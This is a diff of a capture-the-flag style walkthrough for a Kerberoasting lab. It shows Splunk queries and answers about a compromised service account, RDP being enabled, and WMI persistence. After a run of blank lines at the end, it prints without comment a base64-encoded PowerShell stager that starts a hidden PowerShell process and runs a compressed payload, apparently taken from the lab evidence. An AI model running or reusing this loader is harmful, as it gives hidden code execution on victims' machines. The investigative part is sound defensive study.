@@ -8,17 +8,31 @@
 
 **Difficulty:** Medium
 
-**Files:** `FirstHack.ad1` `FirstHack.ad1.txt` ``
+**Files:** `N/A`
 
-**Tools:** `FTK Imager`
+**Tools:** `Splunk Enterprise`
 
-> [FTK Imager](https://www.exterro.com/digital-forensics-software/ftk-imager) is a free data preview and imaging tool used to acquire electronic evidence in a forensically sound manner by creating copies of computer data without making changes to the original evidence.
+> [Splunk Enterprise](https://www.splunk.com/en_us/products/splunk-enterprise.html) is a platform for analyzing machine-generated big data. It indexes data from various sources, providing real-time insights, visualizations, and alerts, primarily for IT operations and security monitoring.
 
-**Note:** In this walkthrough, we will use the FlareVM to analyze the provided file. If you have not set it up yet, I highly recommend following this [malware analysis lab](https://github.com/mmhgwyjs/malware-analysis-lab/blob/main/README.md) guide for assistance with your installation.
+**Note:** In this walkthrough, CyberDefenders offers a lab environment for us to utilize. This feature is included with the PRO subscription.
+
+## **Preparations** 
+
+I chose Splunk Enterprise for this lab.
+
+![image](https://github.com/user-attachments/assets/d416f566-3997-46e1-b551-359b88b7502d)
+
+![image](https://github.com/user-attachments/assets/b6aad2bb-8764-4347-bc4a-25b99a47009b)
+
+![image](https://github.com/user-attachments/assets/620b911e-6ba3-4c5b-8ed0-8b4c28c4d043)
+
+![image](https://github.com/user-attachments/assets/1897f06d-5acc-4700-8adf-8ab11e49ac75)
 
 ## **Questions and Answers**
 
 ***1. What encryption type is currently in use within the network?***
+
+index="kerberoasted" winlog.event_id=4769
 
 ![image](https://github.com/user-attachments/assets/c51b8cae-c5e0-4578-8e54-a9ee89e8a1dd)
 ![image](https://github.com/user-attachments/assets/2b4bba81-3fd9-47c1-8106-68f566019503)
@@ -31,17 +45,96 @@ RC4-HMAC
 
 ![image](https://github.com/user-attachments/assets/51c8b736-6a5a-4751-a328-1ae96b025d42)
 
+![image](https://github.com/user-attachments/assets/bd65afe6-cc90-4791-990a-8c17f72feae2)
+
+index="kerberoasted" winlog.event_id=4769
+|  stats count by winlog.event_data.TargetUserName winlog.event_data.ServiceName @timestamp
+|  dedup winlog.event_data.TargetUserName winlog.event_data.ServiceName
+|  sort -@timestamp
+
+johndoe
 
 ***3. Can you provide the account name of the compromised service account?***
 
+SQLService
+
+index="kerberoasted" 
+| stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.TargetUserName
+
+![image](https://github.com/user-attachments/assets/c291d62a-3729-4be7-a283-58b7b1f39da9)
+
+![image](https://github.com/user-attachments/assets/aa0444ad-bf2b-4a34-8add-7cd13d425a5c)
+
+![image](https://github.com/user-attachments/assets/da63c3ee-e6c7-4000-bbf1-c814236b2e74)
+
+![image](https://github.com/user-attachments/assets/71552609-59ad-473b-b09e-4e2f4d9de36d)
+
+index="kerberoasted" event.action = "*kerberos*"
+| stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.TargetUserName
+
 ***4. What is the machine's IP address?***
+
+10.0.0.154
+
+![image](https://github.com/user-attachments/assets/313dd9c7-120d-458b-9ea7-f6d1550580b7)
+
+![image](https://github.com/user-attachments/assets/47042ae9-f30a-484a-8772-9a80b64edb17)
+
+index="kerberoasted" winlog.event_data.TargetUserName="*SQLService*"
+| stats values(winlog.event_id) as winlog.event_id values(event.action) as event.action count by winlog.event_data.IpAddress
+|  sort -@timestamp
+
 
 ***5. Can you specify the service name installed on the Domain Controller (DC)?***
 
+iOOEDsXjWeGRAyGl
+
+index="kerberoasted" winlog.event_id="7045"
+![image](https://github.com/user-attachments/assets/284971d0-4b69-41c4-a017-b88ce7027c20)
+
+
 ***6. What's the complete registry key path where the attacker modified the value to enable Remote Desktop Protocol (RDP)?***
+
+![image](https://github.com/user-attachments/assets/9a46079c-6d74-430d-897b-b3dae047a897)
+
+HKLM\System\CurrentControlSet\Control\Terminal Server\fDenyTSConnections
+
+![image](https://github.com/user-attachments/assets/0af139b1-6199-4857-aa37-df668510901c)
+
+![image](https://github.com/user-attachments/assets/306a5828-302f-4df1-a9c9-ce6d0a7b106a)
+
 
 ***7. What is the UTC timestamp of the first recorded Remote Desktop Protocol (RDP) login event?***
 
+16-10-2023 07:50:29
+
+![image](https://github.com/user-attachments/assets/deb5a016-c8f8-4d39-8af2-777bff3a1c71)
+
+index="kerberoasted" winlog.event_id=4624 winlog.event_data.LogonType=10
+
+
 ***8. What is the name of the WMI event consumer responsible for maintaining persistence?***
 
+![image](https://github.com/user-attachments/assets/2506521d-0dab-407c-a361-db1bda13b191)
+
+Updater
+
+index="kerberoasted" winlog.event_id=20 winlog.event_data.EventType="*wmi*"
+
 ***9. Which class does the WMI event subscription filter target in the WMI Event Subscription you've identified?***
+
+![image](https://github.com/user-attachments/assets/0738b09a-2c47-428a-af8a-30a53b8bae37)
+
+index="kerberoasted" winlog.event_id=19 winlog.event_data.EventType="*wmi*"
+
+
+
+
+
+
+
+
+
+
+
+aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AbgBpACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEAQQAzAHQATABHAFUAQwBBADcAVgBXAGIAVwArAGIAUwBCAEQAKwBYAHEAbgAvAEEAVgBXAFcAQQBNAGsAeAArAE8AWABhAEoAbABLAGwAVwAzAEMAdwBhAFUAeABDAGcAbAA5AGkAdQAxAFoARgBZAEcAMQB2AHYARwBZAEoATABIAEYAOAB2AGYANwAzAG0AegBVAFEATwAwAHIAUwB5ADUAMwBVAGwAUwB6AHYAeQA4AHoAcwA3AEQAUABQAHoARABEAFAAbwBvAEEAVABGAGsAawBiAEUAMABrAC8AMwByACsAVABpAHUASAA2AGkAYgArAFcAbABNAHIARABmAFQAMQBtAFYAYQBtAHkAdQBWAEgAMwBoAHgAVwArAE0ASwBVAHYAawBqAEoARgBjAGQAeABtAGEANQA5AEUAcwA1AE0AVABNADAAcwBTAEgAUABGADgAWAB7ADAAfQB0AGcAagB0AEkAVQByADIAOABvAHcAYQBtAGkAUwAnACcAKwAnACcAbgA5AEwAbwB5AFYATwA4AE4ASABGAHoAUwAwAE8AdQBQAFIARABxAG4AeQB2AGQAUwBpADcAOABXAGsAaAB0AGoAWAA5AFkASQBtAGwASQB4AFMARgA0AHEAegAnACcAKwAnACcASABBAGwALwA0AFYAZgBOAGkAUwByAGcAaQBmAC8AcwBtAHEAOQBPAGoAKwBxAHgAMgB7ADAAfQBwAGYANQBOAEYAVgBrAGIANQB0ACcAJwArACcAJwB5AHYASwA2AEYAbABNAHEAcQA5AEYATQBWAEYALwBhADMATQBWAFoAawBoAHcAUQBKAFMAOQBtAGMAMQAwAFkAawBhAGoAWgBxAGcAeQBqADEANQAvAGcAYwByAE4AMQBqAEIALwBNAGwAQwAxAE0AWgAzAHIASgAvAFQAWQBKADUAbABrAFMANwBSAHcAawByAHUAWQB3AGkAdwA5AFIATgBXAEkARABDAE0ATQBGAHAASwBsAHsAMAB9AGwAcQBiAEEALwBuAGMAMwArAFYASwBiAEYANQBWAGQAWgB4AE0AawBhADEAKwB5AEkANAA0AFQARgBIAGsANwB1AFMAWQBEAFQAVwB0AHsAMAB9AFAAUQBvAHEAdgA4AEgAdwBHAFcAaAA1AFAAUwBMAFMAWQBxAFMAcQBJADMAYgBNAFYAVgBpAHAAUgBSAG0AbABWACsAaQA5AG0AbABIAE8AOABLAGEARgA3AHEANQBKAHkAcQBBAFIAUwBMAGsALwBVAEsAawBUADAAKwAnACcAKwAnACcAVABNAGQARgBtAFkAVQA1ADQAcgB5AEMAMwA3AG0AJwAnACsAJwAnAEoARgBCAGgANQBFAFEAQQA5AEgANABLAEEATwBjAGwAZAAvAEQAMwBDADcAZgAzAEEAbgB2ADIARwArAFcAWQA3AGsANAB3AHUASwB5ADQATABDAFUANwAnACcAKwAnACcANwBTACsAUwBYAHAAVQBjAHUATgAzAG4ATABOAG4AQwBzAHQASgBQAE0AcQB6AE8ASABnAEcAWABLAHYARgAyAFYASAAyAHIAJwAnACsAJwAnAHMAWABxAHAAQwBYAHIAUgBXAE8ALwBEADEAbgBUAEkAUwBEAGoAYgBHADMAZwBTAC8AawBxAGMAQwBKAEgAWABxAGQAegBHAGMAeABMAGgAOQBqAGIAeQAxAHkAUQBvADIAYQBxADgARgBCAEkAJwAnACsAJwAnADgAcAAzAGkASABTAEsAMABVAE8AdwBmAC8ARgAnACcAKwAnACcATABrADQAdwBHAEUAYgBVADcAegB3AHUAVQBCAFoATQBPAE8AWgAyAHUAbQBhADgARQBkAGQASQB5AE0AMAB4AEEAawBLAEkASwB3AHAAewAnACcAKwAnACcAMAB9AEEAVQBSAFYANQA4ADYAawB3AGQATwBrAHsAMAB9ADMASQAnACcAKwAnACcAdwBXAHYAQQBMAGwAOABEAFYAUwB0AHoAeQBCAEYAJwAnACsAJwAnAGMAUwBoAGQANQBzAFMAMQB2AEYAMgBzAFEAawBrADMAcQBwADIAbABWAGMAagBOAEkAMABxAEEAcQB7ADAAfQBkAGkAbgBPAEsAeABLAEsARQBwAEoAYwBZAFEAeQB6AG4AWgBUAHsAMAB9AHsAMAB9ACsAdQBrADEARgBPAEEAagAvAGwAcABiAG0AWgArAGcAVABNADQAbABLAFQAUgBTAGwAUABzAGcAQgBpAEMAZwBEADAAdgBSAGcASAB4AEsAYwBDAGoANgByAFUASgBTAEUAMgB0AGgANQBaAGwASgBmAEwATAA2AEoAaAArAHAAUgBDADYAbwBDAGwAewAwAH0ANABnAEcANwBBAGcAVQBQAEMANgBZAGsAbwBDAGYAZwBoAFYAcQB6AGMAUABjAFgAcwBjACcAJwArACcAJwBVAHIAMABGAGsAVgB6AEUAcwA2AGkAKwBnAFAAaABUADUAcwBXAE8AVwB2ADgAQwBoAC8ASwBLAFgAWgBSAGIAawBsAEIAewAwAH0AZwBsAEcAZwBjACsAQQBpAFIAOQBpAGoAagBWAFcAbABJAEUAZwA3AFYAUgB3AEEAcwBtAFAAVgAvAFgASABoAHsAMAAnACcAKwAnACcAfQBkAHMAQQBYAE0AOABGAEYAVwBKAFEAeQB0ADYAYgBHAGwAZwB2AHUAVgB6AFoAegBWADkAQwB6AFEARwB7ADAAfQBIAFIAYwBJAEIAQgB5AHQAaABhADgATgBQADgAYwBkAFcAWABtAEMAVQBEADkAbwBGAGMAUgBHAE0AYwBiAHYAcgBFAFQAeABjAGsAYgBxADkAZwBaADgARAB2ADAASAA3AFUAMwBqADIAOQBiAGEAcgBrAGEAYgBOAG4ATQBCAE0AMwBZADcAMQBHAFoASAAnACcAKwAnACcATgBZAGgATgAnACcAKwAnACcAOABQAGsAZABCACsARABYAEUAeAA5ADYAdwB4AGIAMQBUAG0ANQBzAHUANgBsADQAUwAzAFcAZwB0AEEAMABQAHYAdwAzAHgAZwBjADcAdABqADgANwBHAE4AdQB2ADEAbABRAEgAVwAzADMAZABXADgAYwBhAHEAVABUAFgAZgBrAEIARwAzAGoAcgAwADAAagBCAFoASwAyAFcAdAAxAHIASABUAFcAYgByAFkAdQBtAHYAJwAnACsAJwAnAGcATABzAHgAcQBTACsAVwBLAEgAdwBmAEUAMAAyAEQAegAyAFkAUQB5AFcAOQA2AEIAbAAyAGEAdQBnADIAUABmADEAcQBYAHQAMgBNAEcAdABaAGsAUgBMAHQAYQB5ADEAcgBPAFIAeQB6ADEAUABvADcAYgBtAHEAWQBkAGgAMwA3AGIAMgBTAEoAawBzAEwARABwAGIASwAvAHIAVgA2AHoAZgBEAGQAWgBHAEsAMgBMAGEAcwBkAGwAYQBvAFYATwBFAHoATwBoADAAYQBCAG4AcwBiAEcAdwBrAHkATgBXAEcALwBpAEoAbQB3ADMARAB5AFIANgArAHgATQBCAEgAcQBmAEMASgA0AGMAagBtAHcAagBNAHQATAB5ADAAQwBEAHoAdQAxAGQAKwAxAGgAYgBhAE0AewAwAH0AagBhADMAOQBwAGoASQBZAE4ATQBvAG0AdgByADUAYQB3AHQAagBiAGQAUwAwAGYAVABXADMAYQBJAEgAOQBqAG4AMwBvAGcATQA3ADQAVQB0ADQAOAA2AHcASgB0AGMAKwA2AGsAMgAyAGwAcQBiAFYAeAAyAG4ARABYAHgAawBNAEcAUQBDAHMATgBiAGwARABuAHsAMAB9AFUANAB0AGwAdwBLACsAdgAxAEIAZwA2AEUAaABQAGQALwBMAFgAbgBiAGIAWgA4AEcAawAvAGkAbAAxAHYAbgB5AEEATwBFADQASABKAE8ATABOAHgAcQB6AHkARQBIAHEAaQB5AEwAMQAvAFYANwAnACcAKwAnACcAawA5AHkALwBCAEIATgBGACsAcgA0AFkANgBmAHAARQB1AGYAUQBwAFMAaABPAHAAZABwAFoAcgBIAEUASwBnAHEAdQB5ADQAagBRAFUAQgBUAFIAdABGAGMANABpAFQAQwBGAFIAZwB7ADAAfQB0AHMARwBRAG8AbwBwAFEARgBvAHQAcgBuAGwAUgBsAGEAVABkADQAQQBSAEQAOABhADIARAB1AHYAWABwAHEAcAAwAHEATwBnAHUAdQA4AEQANQBkAGIASgB5AFEAUwA4AEYAQwAxAGcANwB0AFoANgBPAEYAcgB3AFoAVgBWAC8AYQBPAG8ANgBsAEcALwA5AFEAVwAvAHQAMgBQADMAMgBwADUAawBzADMAaQByAEMAVgBsAFgAVQAvAHgAMAAwAGgAVwAyADYAcwB3ADMAbQB5AEYAeABTAGwATgA4AE8ARgBuAFIANQBEAGgAWABuAEYAMwBDADkAaABoAHoAYwB2AFkASQBpAEEAUwBVAHIAegAxADIAQgBuADgARQBZAFAAVQBTAHYAewAwAH0ATgBnAGoARwBRADcAQQBBADkAVABxADgAUABTAHAANgBQAEMAQwBKAEsAQgAvAGgATwAvAGcAUQAwAFMAMAB2ADgATgAyAFcAZwBuAFEANABMAGYAUwBwAGkAaABBAFMALwBnAEwALwA1AFUAMgArADcAMQBmAG4ATAA2AEoAUwBuAG8AMQBSACsAZgBaADkAdABPAE4AZwA4AHIAOQArAHkAQQBZACsAWQBTAEQAbwBBAHsAMAB9AGwAbABPAEsAOAByADcAKwBDAFIASgBFAHIAQgB5AEcARwA4AEUAQQBtAHoASQBzAGgAUABuAFkAdgBNAG4ANQAwAEQAcAA5AFAAdQAyAHIAKwBEADgAMgAzAEcAcABKAGsAQwB3AEEAQQAnACcAKQAtAGYAJwAnAGUAJwAnACkAKQApACkALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQApACkAJwA7ACQAcwAuAFUAcwBlAFMAaABlAGwAbABFAHgAZQBjAHUAdABlAD0AJABmAGEAbABzAGUAOwAkAHMALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAE8AdQB0AHAAdQB0AD0AJAB0AHIAdQBlADsAJABzAC4AVwBpAG4AZABvAHcAUwB0AHkAbABlAD0AJwBIAGkAZABkAGUAbgAnADsAJABzAC4AQwByAGUAYQB0AGUATgBvAFcAaQBuAGQAbwB3AD0AJAB0AHIAdQBlADsAJABwAD0AWwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA=
